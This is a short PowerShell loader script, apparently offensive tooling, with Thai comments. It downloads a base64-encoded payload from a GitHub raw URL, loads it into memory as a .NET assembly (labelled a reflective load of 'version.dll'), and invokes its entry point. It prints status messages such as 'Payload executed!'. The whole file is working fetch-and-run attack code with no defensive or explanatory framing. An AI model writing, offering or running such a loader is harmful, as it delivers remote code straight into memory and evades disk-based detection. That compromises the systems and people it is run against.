# load.ps1
$url = "https://raw.githubusercontent.com/puddyeieiei/dydestiny/main/payload.b64"

Write-Host "[*] Downloading payload from GitHub..." -ForegroundColor Cyan

try {
    $base64 = (iwr -UseBasicParsing $url).Content
    $bytes = [Convert]::FromBase64String($base64)
    
    Write-Host "[*] Loading version.dll into memory (Reflective Load)..." -ForegroundColor Cyan
    
    # โหลด DLL เข้า RAM
    $assembly = [System.Reflection.Assembly]::Load($bytes)
    
    Write-Host "[+] DLL loaded successfully!" -ForegroundColor Green
    
    # เรียก DllMain (entry point)
    $entryPoint = $assembly.EntryPoint
    if ($entryPoint) {
        Write-Host "[*] Executing DllMain..." -ForegroundColor Cyan
        $entryPoint.Invoke($null, @(0, 1, $null))
    }
    
    Write-Host "[+] Payload executed!" -ForegroundColor Green
}
catch {
    Write-Host "[-] Failed: $_" -ForegroundColor Red
}
